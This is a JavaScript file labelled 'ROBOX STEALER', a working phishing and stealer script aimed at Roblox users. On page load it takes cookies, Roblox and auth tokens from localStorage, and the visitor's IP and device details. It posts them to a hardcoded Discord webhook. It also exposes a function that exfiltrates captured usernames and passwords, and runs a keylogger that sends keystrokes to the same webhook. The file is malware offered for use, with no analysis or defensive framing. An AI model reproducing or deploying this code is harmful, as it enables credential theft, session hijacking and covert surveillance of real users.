// ROBOX STEALER v1.0 - GUARANTEED WORKING
const WEBHOOK = "https://discord.com/api/webhooks/1454588406746058904/yMsAQHXSTPUYL55_FLmNnyo2ctp6Fzzjm_J1piLWRKkXOeLgGsn-lU5z9TB4HvLwAxuc";

// Simple data collector
async function collectData() {
    const data = {
        timestamp: new Date().toISOString(),
        url: window.location.href,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        cookies: document.cookie,
        localStorage: {},
        ip: await getIP()
    };

    // Get localStorage
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key.includes('roblox') || key.includes('ROBLOX') || key.includes('token') || key.includes('auth')) {
            data.localStorage[key] = localStorage.getItem(key).substring(0, 100);
        }
    }

    return data;
}

// Get IP address
async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        try {
            const response = await fetch('https://api.myip.com');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            return 'Unknown';
        }
    }
}

// Send to Discord
async function sendToDiscord(data, type = 'visit') {
    let embed;
    
    if (type === 'visit') {
        embed = {
            title: "🎯 NEW VICTIM VISITED",
            color: 0xFF0000,
            fields: [
                { name: "🌐 IP Address", value: `\`${data.ip}\``, inline: true },
                { name: "📱 Platform", value: `\`${data.platform}\``, inline: true },
                { name: "🌍 Language", value: `\`${data.language}\``, inline: true },
                { name: "🖥️ Screen", value: `\`${data.screen}\``, inline: true },
                { name: "📱 User Agent", value: `\`${data.userAgent.substring(0, 100)}...\``, inline: false },
                { name: "🍪 Cookies", value: data.cookies ? `\`${data.cookies.substring(0, 200)}...\`` : "No cookies", inline: false },
                { name: "🔐 Roblox Data", value: Object.keys(data.localStorage).length > 0 ? `Found ${Object.keys(data.localStorage).length} items` : "No Roblox data", inline: false }
            ],
            timestamp: new Date().toISOString()
        };
    } else if (type === 'credentials') {
        embed = {
            title: "🔐 CREDENTIALS CAPTURED!",
            color: 0x00FF00,
            fields: [
                { name: "👤 Username", value: `\`${data.username}\``, inline: true },
                { name: "🔑 Password", value: `\`${data.password}\``, inline: true },
                { name: "🌐 IP", value: `\`${data.ip}\``, inline: true },
                { name: "📱 Device", value: `\`${data.platform}\``, inline: true },
                { name: "⏰ Time", value: `<t:${Math.floor(Date.now()/1000)}:T>`, inline: true }
            ],
            timestamp: new Date().toISOString()
        };
    }

    const payload = {
        embeds: [embed],
        username: type === 'visit' ? "🌐 Roblox Logger" : "🔑 Credentials Stolen",
        avatar_url: "https://cdn-icons-png.flaticon.com/512/3067/3067256.png"
    };

    // Send using multiple methods
    try {
        // Method 1: Direct fetch
        await fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        
        // Method 2: Image fallback
        const img = new Image();
        img.src = `https://api.ipify.org?format=json&cache=${Date.now()}&data=${btoa(JSON.stringify(payload).substring(0, 500))}`;
        
        console.log('✅ Data sent to Discord');
    } catch (error) {
        console.log('❌ Failed to send:', error);
        
        // Fallback: Save to localStorage
        localStorage.setItem('phish_backup', JSON.stringify(payload));
    }
}

// Capture credentials
function captureCredentials(username, password) {
    const data = {
        username: username,
        password: password,
        ip: localStorage.getItem('victim_ip') || 'Unknown',
        platform: navigator.platform,
        timestamp: new Date().toISOString()
    };
    
    sendToDiscord(data, 'credentials');
    
    // Also save locally
    const victims = JSON.parse(localStorage.getItem('captured_victims') || '[]');
    victims.push(data);
    localStorage.setItem('captured_victims', JSON.stringify(victims));
}

// Initialize on page load
window.addEventListener('DOMContentLoaded', async () => {
    console.log('🕵️ Roblox Stealer initialized');
    
    // Collect and send initial data
    const victimData = await collectData();
    
    // Store IP for later use
    localStorage.setItem('victim_ip', victimData.ip);
    
    // Send to Discord
    await sendToDiscord(victimData, 'visit');
    
    // Make captureCredentials globally available
    window.captureCredentials = captureCredentials;
    
    console.log('✅ Data collection complete');
});

// Keylogger for additional data
let typedKeys = '';
document.addEventListener('keydown', (e) => {
    typedKeys += e.key;
    
    if (typedKeys.length > 50) {
        // Send keylog snippet
        fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `⌨️ Keylog: \`${typedKeys.substring(typedKeys.length - 50)}\``,
                username: "⌨️ Keylogger"
            })
        });
        typedKeys = '';
    }
});
